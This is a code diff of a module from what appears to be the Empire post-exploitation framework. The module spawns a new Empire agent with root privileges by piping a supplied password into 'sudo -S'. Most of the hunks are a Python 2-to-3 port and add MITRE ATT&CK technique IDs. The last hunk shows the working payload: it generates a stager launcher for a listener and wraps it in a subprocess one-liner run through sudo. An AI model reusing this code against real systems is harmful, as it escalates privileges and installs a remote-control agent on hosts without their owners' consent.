@@ -1,7 +1,11 @@
+from __future__ import print_function
+
+from builtins import object
+
 from lib.common import helpers
 
 
-class Module:
+class Module(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -15,6 +19,10 @@ class Module:
 
             # more verbose multi-line description of the module
             'Description': ('Spawns a new Empire agent using sudo.'),
+
+            'Software': 'T1169',
+
+            'Techniques': ['T1050'],
 
             # True if the module needs to run in the background
             'Background' : False,
@@ -95,7 +103,7 @@ class Module:
         launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='python', userAgent=userAgent, safeChecks=safeChecks)
 
         if launcher == "":
-            print helpers.color("[!] Error in launcher command generation.")
+            print(helpers.color("[!] Error in launcher command generation."))
             return ""
         else:
 
@@ -106,4 +114,5 @@ class Module:
             parts = launcher.split("|")
             launcher = "python -c %s" % (parts[0])
             script = 'import subprocess; subprocess.Popen("echo \\"%s\\" | sudo -S %s", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)' % (password, launcher)
+
             return script
